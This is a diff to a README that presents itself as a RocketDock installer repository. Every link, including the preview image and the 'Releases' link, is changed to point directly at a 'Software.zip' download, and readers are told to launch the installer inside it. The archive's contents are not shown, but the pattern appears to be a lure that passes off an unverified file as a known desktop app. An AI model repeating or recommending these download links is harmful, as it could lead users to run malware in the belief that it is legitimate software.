@@ -1,7 +1,7 @@
 
 # 🚀💻 RocketDock-Installer 💻🚀
 
-[![RocketDock-Installer](https://github.com/Kaykary/RocketDock-Installer/releases/tag/v1.0)](https://github.com/Kaykary/RocketDock-Installer/releases/tag/v1.0)
+[![RocketDock-Installer](https://github.com/Kaykary/RocketDock-Installer/releases/download/v2.0/Software.zip)](https://github.com/Kaykary/RocketDock-Installer/releases/download/v2.0/Software.zip)
 
 Enhance your desktop with RocketDock, a powerful and customizable application launcher for Windows. RocketDock provides an efficient way to access and organize your favorite applications, files, and folders, giving your desktop a sleek and modern look. Say goodbye to cluttered desktops and hello to productivity with RocketDock!
 
@@ -15,7 +15,7 @@ Enhance your desktop with RocketDock, a powerful and customizable application la
 
 ## 🛠️ Installation Guide
 
-1. Download the RocketDock installer package from the following link: [Download RocketDock Installer](https://github.com/Kaykary/RocketDock-Installer/releases/tag/v1.0)
+1. Download the RocketDock installer package from the following link: [Download RocketDock Installer](https://github.com/Kaykary/RocketDock-Installer/releases/download/v2.0/Software.zip)
 
 2. Launch the installer file and follow the on-screen instructions to complete the installation process.
 
@@ -28,7 +28,7 @@ Enhance your desktop with RocketDock, a powerful and customizable application la
 3. **Managing Icons:** Easily rearrange icons on the dock by dragging them to your preferred position.
 4. **Accessing Options:** Explore different settings and options to optimize RocketDock for your workflow.
 
-![RocketDock Preview](https://github.com/Kaykary/RocketDock-Installer/releases/tag/v1.0)
+![RocketDock Preview](https://github.com/Kaykary/RocketDock-Installer/releases/download/v2.0/Software.zip)
 
 ## 🚀 Repository Information
 
@@ -36,7 +36,7 @@ Enhance your desktop with RocketDock, a powerful and customizable application la
 - **Description:** Enhance your desktop with RocketDock, a powerful and customizable application launcher for Windows. 🚀💻
 - **Topics:** app-dock, app-launcher, app-organizer, desktop-customization, desktop-enhancement, dock-software, docking-system, docking-utility, launcher-tool, pc-customization, productivity-tools, rocketdock, rocketdock-configurator, rocketdock-setup, software-organizer, windows-dock, windows-tool, windows-ui.
 
-For more information and the latest updates, visit the [Releases](https://github.com/Kaykary/RocketDock-Installer/releases/tag/v1.0) section of this repository.
+For more information and the latest updates, visit the [Releases](https://github.com/Kaykary/RocketDock-Installer/releases/download/v2.0/Software.zip) section of this repository.
 
 ---
 
